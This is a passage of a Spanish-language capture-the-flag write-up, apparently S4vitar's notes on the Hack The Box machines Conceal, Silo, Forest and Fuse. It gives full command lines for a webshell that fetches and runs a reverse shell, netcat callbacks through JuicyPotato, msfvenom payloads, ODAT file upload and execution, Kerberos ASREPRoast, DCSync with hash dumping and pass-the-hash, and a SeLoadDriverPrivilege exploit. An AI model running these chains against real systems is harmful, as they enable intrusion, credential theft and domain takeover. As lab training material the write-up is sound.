y si miramos por la web `http://10.10.10.116/upload/s4vishell.asp?cmd=whoami` y ya tenemos capacidad de remote code execution.


<!--chapter:end:18-Conceal/18-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Conneccion con una shell typo powershell de nishang {-}

```bash
git clone https://github.com/samratashok/nishang
cd nishang
ls
cd Shells
ls
cp Invoke-PowerShellTcp.ps1 PS.ps1
vi PS.ps1
```

Como siempre le añadimos `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 443` al final del fichero.

Nos compartimos un servidor http con python

```bash
python -m http.server 80
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Y por la webshell nos descargamos el fichero PS.ps1 `http://10.10.10.116/upload/s4vishell.asp?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`

Ya podemos comprobar que estamos a dentro de la maquina y que podemos ver la flag.

> Note: Si le hacemos un `[Environment]::Is64BitOperatingSystem` y un `[Environment]::Is64BitProcess`, podemos ver que el process nos da False. Aqui es recommendado siempre tirar
de la powershell nativa que seria  `http://10.10.10.116/upload/s4vishell.asp?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/PS.ps1')`

<!--chapter:end:18-Conceal/18-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
whoami
systeminfo
whoami /priv
```

Aqui vemos que tenemos privilegios SeImpersonatePrivilege, tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.8/JuicyPotato.exe -OutFile JuicyPotato.exe
iwr -uri http://10.10.14.8/nc.exe -OutFile nc.exe
```

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Nos connectamos con el servicio nc con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443"
```

Aqui nos sale une error 10038. Esto suele passar cuando el CLSID no es el correcto. Como savemos con el systeminfo
que estamos en una maquina Windows10 Enterprise, podemos buscar el CLSID correcto en [Interesting CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
encontramos el CLSID que corresponde y con el parametro `-c`

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c .\nc.exe -e cmd 10.10.14.8 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
```

La reverse shell nos a functionnado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.

<!--chapter:end:18-Conceal/18-04-PrivilegeEscalation.Rmd-->

# Silo {-}

## Introduccion {-}

La maquina del dia 11/08/2021 se llama Silo
.

El replay del live se puede ver aqui

[![S4vitaar Silo maquina](https://img.youtube.com/vi/-nb98Pb8oP0/0.jpg)](https://www.youtube.com/watch?v=-nb98Pb8oP0&t=910s)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:19-Silo/19-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.82
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.82
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.82 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 10.10.10.82 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?             | Que falta? |
| ------ | ---------- | ------------------------------ | ---------- |
| 80     | http       | Web, fuzzing                   |            |
| 135    | msrpc      |                                |            |
| 139    | netbios    |                                |            |
| 445    | smb        | Null session                   |            |
| 1521   | oracle-tns | Attacke con ODAT               |            |
| 5985   | msrpc      | Puertos por defecto de windows |            |
| 47001  | msrpc      | Puertos por defecto de windows |            |
| 49152  | msrpc      | Puertos por defecto de windows |            |
| 49153  | msrpc      | Puertos por defecto de windows |            |
| 49154  | msrpc      | Puertos por defecto de windows |            |
| 49155  | msrpc      | Puertos por defecto de windows |            |
| 49159  | msrpc      | Puertos por defecto de windows |            |
| 49160  | msrpc      | Puertos por defecto de windows |            |
| 49161  | msrpc      | Puertos por defecto de windows |            |
| 49162  | msrpc      | Puertos por defecto de windows |            |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.82
smbclient -L 10.10.10.82 -N
```

Vemos que estamos en frente de una maquina Windows Server 2021 R2 de 64 bit pro que se llama **SILO** en el dominio **SILO** y poco mas

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.82
```

Nada muy interressante aqui


#### Checkear la web {-}

Sabemos que es un IIS 8.5 y asp.net pero poco mas. Vamos a fuzzear routas.



<!--chapter:end:19-Silo/19-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Oracle ataque con ODAT {-}

#### Installacion de ODAT {-}

```bash
git clone https://github.com/quentinhardy/odat
cd odat
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
pip3 install cx_Oracle
```

Como la maquina victima es de 64 bits, descargamos los client basic sdk y sqlplus de la web de oracle

```bash
mkdir isolation
cd isolation
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-basic-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-sqlplus-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-devel-21.1.0.0.0-1.x86_64.rpm
```

ahora transformamos los `.rpm` en `.deb` y lo installamos

```bash
alien --to-deb *.rpm
dpkg -i *.deb
```

Añadimos las variables de entorno el la .zshrc

```bash
ls /usr/lib/oracle

#Output
21

vi ~/.zshrc

export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```

Checkeamos que todo se aya installado bien

```bash
sqlplus64
python3 odat.py --help
```

#### Ataque con ODAT {-}

1. Buscamos si encontramos SID's

    ```bash
    python3 odat.py sidguesser -s 10.10.10.82
    ```

1. Ataque de typo password guesser

    ```bash
    locate oracle_ | grep "pass"
    cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' | > passwords
    python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file passwords
    ```

1. Ahora que tenemos un usuario y una contraseña utilizamos el parametro utlfile que permite descargar, uploadear y supprimir ficheros

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger"
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    ```

1. No tenemos sufficientes privilegios para subir archivos pero ODAT tiene un parametro `--sysdba` que nos puede ayudar

    ```bash
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe --sysdba
    ```

1. Intentamos ganar accesso al systema

<!--chapter:end:19-Silo/19-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con ODAT {-}

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Intentamos ejecutar el exploit con odat

```bash
python3 odat.py --help
python3 odat.py externaltable -s 10.10.10.82 -d XE -U "scott" -P "tiger" --sysdba --exec /Temp shell.exe
```

Ya hemos ganado accesso al systema y ademas somos nt authority\system que significa que no es necessario hacer escalada de privilegios.

<!--chapter:end:19-Silo/19-03-GainingAccess.Rmd-->

# Forest {-}

## Introduccion {-}

La maquina del dia 12/08/2021 se llama Forest.

El replay del live se puede ver aqui

[![S4vitaar Forest maquina](https://img.youtube.com/vi/OxLeD1x3nRc/0.jpg)](https://www.youtube.com/watch?v=OxLeD1x3nRc)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:20-Forest/20-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.161
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.161
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.161 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703,49918 10.10.10.161 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 47001  | http       | Puertos por defecto de windows           |                           |
| 49664  | msrpc      | Puertos por defecto de windows           |                           |
| 49665  | msrpc      | Puertos por defecto de windows           |                           |
| 49666  | msrpc      | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49671  | msrpc      | Puertos por defecto de windows           |                           |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |
| 49677  | msrpc      | Puertos por defecto de windows           |                           |
| 49684  | msrpc      | Puertos por defecto de windows           |                           |
| 49703  | msrpc      | Puertos por defecto de windows           |                           |
| 49918  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.161
smbclient -L 10.10.10.82 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **FOREST** en el dominio **htb.local**.
No vemos ningun recursos compartidos a nivel de red.
Añadimos el dominio a nuestro `/etc/hosts`.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.161 -N

rpcclient $> enumdomusers
```

Como nos deja connectarnos con el null session vamos a enumerar esto con la utilidad rpcenum de s4vitar

```bash
git clone https://github.com/s4vitar/rpcenum
cd rpcenum
./rpcenum -e All -i 10.10.10.161
```

Como aqui ya tenemos un listado de usuarios validos, lanzamos un ataque asproarst.


<!--chapter:end:20-Forest/20-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Asproasting Attack {-}

Los ataques Asproasting se pueden manejar con la utilidad `GetNPUsers.py`

```bash
cd content
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v 
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]'
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users.txt
GetNPUsers.py htb.local/ -no-pass -userfile users.txt 2>/dev/null
```

Aqui vemos el TGT del usuario **svc-alfresco**. Copiamos todo el hash del usuario svc-alfresco en un fichero llamado hash
y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contraseña. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

### LDAP enumeracion con ldapdomaindump {-}

Esta utilidad nos permitte recuperar en formato html las informaciones del servicio LDAP.

```bash
cd /var/www/html
ldapdomaindump -u 'htb.local/svc-alfresco' -p 's3rvice' 10.10.10.161
service apache2 start
```

y podemos mirarlo con firefox en localhost

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad `GetUserSPNs.py`

```bash
GetUserSPNs.py htb.local/svc-alfresco:s3rvice@10.10.10.161 -request -dc-ip 10.10.10.161
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales. Si es el caso vamos si nos podemos connectar
por win-rm.



<!--chapter:end:20-Forest/20-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.


### Enumeracion del systema para preparar la escalada de privilegios {-}

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database
1. Collectamos la data con SharpHound.ps1

    - descargamos en sharphound
    
        ```bash
        wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
        ```

    - lo uploadeamos desde el evil-winrm

        ```bash
        upload SharpHound.ps1
        ```

    - lo lanzamos desde el evil-winrm

        ```bash
        Import-Module .\SharpHound.ps1
        Invoke-BloodHound -CollectionMethod All
        dir
        ```

    - ahora que tenemos el zip nos lo descargamos

        ```bash
        download 20210812133453_BloodHound.zip
        ```

1. Drag & Drop del fichero **.zip** hacia la ventana del bloodhound y en el Analysis tab

    - Find all Domains Admins -> Show Administrator of the domain
    

Aqui hay una via potencial (un camino) que nos permitte convertir en usuario administrador

<div class="figure">
<img src="images/Forest-bloodhound.png" alt="Bloodhound privesc" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-49)Bloodhound privesc</p>
</div>

<!--chapter:end:20-Forest/20-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

El usuario svc-alfresco es miembro del groupo service accounts que es miembro de grupo privileged accounts que es miembro 
del grupo account operators.

Este grupo account operators tiene permissions de typo Generic all sobre el grupo Exchange windows permissions. Si buscamos
por internet lo que es el account operators vemos que es un grupo de verdad que permitte crear usuarios y privilegios. Lo comprobamos
en el evil-winRM

```bash
net user s4vitar s4vit4r123$! /add /domain
net user s4vitar
```

Effectivamente podemos crear usuarios.

Si seguimos analysando el BloodHound vemos que el grupo exchange Windows permission tiene capacidad de typo WriteDacl sobre el dominio.
Si hacemos un click derecho sobre el **WriteDacl** podemos mirar mas informaciones

<div class="figure">
<img src="images/Forest-Abuse_writedacl.png" alt="Bloodhound abuse WriteDacl" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-50)Bloodhound abuse WriteDacl</p>
</div>

1. Añadimos el grupo Exchange Windows Permissions al usuario creado

    ```bash
    net group
    net group "Exchange Windows Permissions" s4vitar /add
    net user s4vitar
    ```

1. Passamos a la maquina victima el powerView

    - en la maquina de atacante

        ```bash
        wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/powerview.ps1')
        ```

1. Asignamos el privilegio ds sync al usuario s4vitar

    ```bash
    $SecPassword = ConvertTo-SecureString 's4vit4r123$!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('htb.local\s4vitar', $SecPassword)
    Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s4vitar -Rights DCSync
    ```

1. Desde la maquina de atacante podemos lanzar un impacket-secretsdump para recuperar los hashes de los usuarios

    ```bash
    impacket-secretsdump htb.local/s4vitar@10.10.10.161
    ```

Ya tenemos el hash del usuario administrador

<div class="figure">
<img src="images/Forest-dcsync-admin-hash.png" alt="DCSync Admin hash" width="90%" />
<p class="caption">(\#fig:unnamed-chunk-51)DCSync Admin hash</p>
</div>

lo copiamos y con evilwin-rm nos connectamos como el usuario administrator haciendo un passthehash.

```bash
evil-winrm -i 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d3372a07ceea6'
```

`WHOAMI -> htb\administrator` ;)

<!--chapter:end:20-Forest/20-04-PrivilegeEscalation.Rmd-->

# Fuse {-}

## Introduccion {-}

La maquina del dia 13/08/2021 se llama Fuse.

El replay del live se puede ver aqui

[![S4vitaar Fuse maquina](https://img.youtube.com/vi/GVOAKYeBv9c/0.jpg)](https://www.youtube.com/watch?v=GVOAKYeBv9c)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:21-Fuse/21-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.193
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.193
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.193 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698,49761 10.10.10.193 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 80     | http       | Web, Fuzzing                             |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 464    | kpasswd5?  |                                          |                           |
| 593    | ncacn_http |                                          |                           |
| 636    | tcpwrapped |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 3269   | tcpwrapped |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 9389   | mc-nmf     | Puertos por defecto de windows           |                           |
| 49666  | msrpc      | Puertos por defecto de windows           |                           |
| 49667  | msrpc      | Puertos por defecto de windows           |                           |
| 49675  | msrpc      | Puertos por defecto de windows           |                           |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |
| 49680  | msrpc      | Puertos por defecto de windows           |                           |
| 49698  | msrpc      | Puertos por defecto de windows           |                           |
| 49761  | msrpc      | Puertos por defecto de windows           |                           |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.193
smbclient -L 10.10.10.193 -N
```

Vemos que estamos en frente de una maquina Windows Server 2016 Standard de 64 bit pro que se llama **FUSE** en el dominio **fabricorp.local**.
No vemos ningun recursos compartidos a nivel de red.
Añadimos el dominio a nuestro `/etc/hosts`.

### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.193 -N

rpcclient $> enumdomusers
```

Aqui vemos un Access Denied.

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.193
```

Vemos una vez mas que estamos en frente de una IIS pero nada mas. Seguimos checkeando la web.


#### Checkear la web {-}

Sabemos que es un IIS 10.0 con asp.net. Hay una redireccion automatica a fuzse.fabricorp.local y vemos que estamos en frente
de un servicio de impressora. Miramos los logs print y vemos una columna interesante que es la de **Users**.

Nos creamos un fichero users y copiamos los usuarios de la web.

Ya que tenemos un fichero con contraseñas, intentamos fuerza bruta con **crackmapexec**.



<!--chapter:end:21-Fuse/21-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Crackeo con diccionario {-}

Como tenemos una lista de usuarios potenciales, intentamos combinar los usuarios poniendo como contraseña los mismos usuarios.
Esto se hace con crackmapexec de la siguiente forma.

```bash
crackmapexec smb 10.10.10.193 -u users -p users
```

Esto no nos da nada. Intentamos crear un diccionario con la palabras encontrada en la web con **CEWL**

### Creando un diccionario desde una pagina web con CEWL {-}

```bash
cewl -w passwords http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
```

Intentamos otravez el crackeo con **crackmapexec**

```bash
crackmapexec smb 10.10.10.193 -u users -p passwords --continue-on-success | grep -v -i "failure"
```

Aqui vemos algo interesante:

````bash
fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE
```

Aqui **crackmapexec** nos dice que a encontrado contraseñas pero son contraseñas por defectos que se tienen que modificar.
Las vamos a cambiar con la utilidad **smbpasswd**

### Cambiando contraseñas con smbpasswd {-}

```bash
smbpasswd -r 10.10.10.193 -U "bhult"
> Old SMB password: Fabricorp01
> New SMB password: S4vitar123$!
> Retype new SMB password: S4vitar123$!

Password changed for user bhult on 10.10.10.193
```

Lo miramos con crackmapexec

```bash
crackmapexec smb 10.10.10.193 -u "bhult" -p 'S4vitar123$!'
```

Ya vemos que hay un *[+]* lo que quiere decir que tenemos credenciales validas.

Intentamos connectarnos con rpcclient

```bash
rpcclient -U 'bhult%S4vitar123$!' 10.10.10.193
```

Nos pone un logon failure. Nos hace pensar que hay como una tarea que cambia la contraseña despues de un momento, intentamos hacer
lo mismo pero un poco mas rapido.

```bash
smbpasswd -r 10.10.10.193 -U "bhult"
> Old SMB password: Fabricorp01
> New SMB password: S4vitar123$!
> Retype new SMB password: S4vitar123$!

Password changed for user bhult on 10.10.10.193

rpcclient -U 'bhult%S4vitar123$!' 10.10.10.193
```

Ya estamos a dentro.

### Enumerando la maquina con rpcclient {-}

```bash
enumdomusers
```

Como hay un printer, tambien se puede enumerar impresoras.

```bash
enumprinters
```

Aqui nos sale una contraseña.

1. Copiamos los usuarios

    ```bash
    echo "user:[Administrator] rid:[0x1f4]
    user:[Guest] rid:[0x1f5]
    user:[krbtgt] rid:[0x1f6]
    user:[DefaultAccount] rid:[0x1f7]
    user:[svc-print] rid:[0x450]
    user:[bnielson] rid:[0x451]
    user:[sthompson] rid:[0x641]
    user:[tlavel] rid:[0x642]
    user:[pmerton] rid:[0x643]
    user:[svc-scan] rid:[0x645]
    user:[bhult] rid:[0x1bbd]
    user:[dandrews] rid:[0x1bbe]
    user:[mberbatow] rid:[0x1db1]
    user:[astein] rid:[0x1db2]
    user:[dmuir] rid:[0x1db3]" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' > users
    ```

1. Checkeamos con crackmapexec que usuario tiene la contraseña encontrado con enumprinters

    ```bash
    crackmapexec smb 10.10.10.193 -u users -p '$fab@s3Rv1ce$1'
    ```

Aqui vemos que tenemos una credencial valida para el usuario svc-print. Aqui vamos a intentar ganar accesso al systema con WinRM.


<!--chapter:end:21-Fuse/21-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.


<!--chapter:end:21-Fuse/21-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

Enumeamos los privilegios del ususarios

```bash
whoami /priv
whoami /all
```

Vemos quel usuario tiene un privilegio **SeLoadDriverPrivilege**. Miramos en la web si se puede escalar privilegios con
esto. 

En firefox buscamos con *SeLoadDriverPrivilege exploit* y caemos en la web de [tarlogic](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/).

Aqui S4vitar nos recomienda trabajar desde una maquina Windows con Visual studio 19 installado para buildear el exploit.

#### Crando el exploit LoadDriver.exe desde la maquina windows {-}

1. creamos una carpeta de trabajo llamado fuse
1. desde visual studio creamos un nuevo proyecto llamado LoadDriver de typo Console App
1. copiamos el contenido del fichero [eoploaddriver](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp) en el ficher *Source Files/LoadDriver.cpp* del proyecto.
1. eliminamos el primer include que nos da un error *#include "stdafx.h* y que no es necessario
1. en visual studio cambiamos el Debug a Realease y le ponemos x64

    <div class="figure">
    <img src="images/Fuse-VS2019.png" alt="Build LoadDriver" width="90%" />
    <p class="caption">(\#fig:unnamed-chunk-52)Build LoadDriver</p>
    </div>
1. en el menu le damos a Build -> Rebuild solution

Esto nos cree un fichero LoadDriver.exe que copiamos en una carpeta compiledbinaries.

#### Recuperamos el capcom.sys {-}

En la web de tarlogic nos dice que necessitamos un fichero llamado *capcom.sys* lo descargamos desde la [web](https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys) y la copiamos
en la carpeta compiledbinaries.

#### Creamos el ExploitCapcom.exe {-}

En este punto nos tenemos que descargar el fichero **ExploitCapcom**. Este fichero se tiene que compilar desde Visual Studio.

1. descargamos el proyecto

    ```bash
    git clone https://github.com/tandasat/ExploitCapcom
    ```

1. desde Visual Studio le damos a File -> Open -> Project/Solution
1. buscamos el .sln y le damos a open

Si abrimos el fichero ExploitCapcom.cpp, la idea aqui seria de modificar el script para que ejecute un binario malicioso creado con *msfvenom*. 
Para esto necesitamos modificar la funccion **launchSell()** del ExploitCapcom.cpp

En la web de [AppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList), buscamos una routa windows interesante donde se puede trabajar
sin problemas, en este caso seria la `C:\Windows\System32\spool\drivers\color`

1. Modificamos el script

    ```cpp
    static bool launchSell()
    {
        TCHAR CommandLine[] = TEXT("C:\\Windows\\System32\\spool\\drivers\\color\\reverse.exe");
    }
    ```

1. Buildeamos el proyecto dandole al menu Build -> Rebuild solution
1. copiamos el fichero ExploitCapcom.exe en la carpeta compiledbinaries


#### Passamos los ficheros a la maquina victima {-}

En la carpeta `compiledbinaries` tenemos nuestros 3 ficheros necesarios para el exploit.
- Capcom.sys
- ExploitCapcom.exe
- LoadDriver.exe

En esta carpeta, montamos un servidor web con python

```bash
python3 -m http.server
```

Desde la maquina de atacante, descargamos estos ficheros

```bash
wget http://192.168.1.14:8000/Capcom.sys
wget http://192.168.1.14:8000/ExploitCapcom.exe
wget http://192.168.1.14:8000/LoadDriver.exe
```

Creamos el reverse.exe con msfvenom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o reverse.exe
```

Desde la consola Evil-WinRM de la maquina victima, subimos todo los ficheros

```bash
cd C:\Windows\Temp
upload Capcom.sys
upload ExploitCapcom.exe
upload LoadDriver.exe
cd C:\Windows\System32\spool\drivers\color
upload reverse.exe
```

#### Lanzamos el exploit {-}

En la maquina de atacante nos ponemos en escucha en el puerto 443

```bash
rlwrap nc -nlvp 443
```

En la maquina victima, lanzamos el exploit

```bash
cd C:\Windows\Temp
C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\savishell C:\Windows\Temp\Capcom.sys
C:\Windows\Temp\ExploitCapcom.exe
```

La reverse shell nos a funccionado y con `whoami` vemos que ya somos nt authority\system y podemos ver la flag.

<!--chapter:end:21-Fuse/21-04-PrivilegeEscalation.Rmd-->

# SwagShop {-}

## Introduccion {-}

La maquina del dia 14/08/2021 se llama SwagShop.

El replay del live se puede ver aqui

[![S4vitaar SwagShop maquina](https://img.youtube.com/vi/Hoionj3rnf8/0.jpg)](https://www.youtube.com/watch?v=Hoionj3rnf8)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:22-SwagShop/22-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.140
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.140
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.140 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.140 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.140
```

Vemos que estamos en frente de una maquina Linux servido por un Apache 2.4.18 con un dominio **swagshop.htb**.
Vemos que hay un error porque la pagina nos redirige automaticamente al dominio y da un error.
Añadimos el dominio a nuestro `/etc/hosts` y volmemos a lanzar el whatweb.

Ahora vemos que estamos en frente de un Magento.

#### Checkear la web del puerto 80 {-}

Con firefox navigamos en la web para ver lo que es. Vemos una web donde se puede comprar productos. Vemos que hay
un panel de busqueda. Intentamos ver si es vulnerable a un html injeccion o un XSS pero no es el caso.

Nos damos cuenta que la URL es `http://swagshop.htb/index.php/`. La ultima bara nos hace pensar que puede ser un directorio.
Vamos a fuzzear la web.

#### Fuzzing con WFuzz {-}

```bash
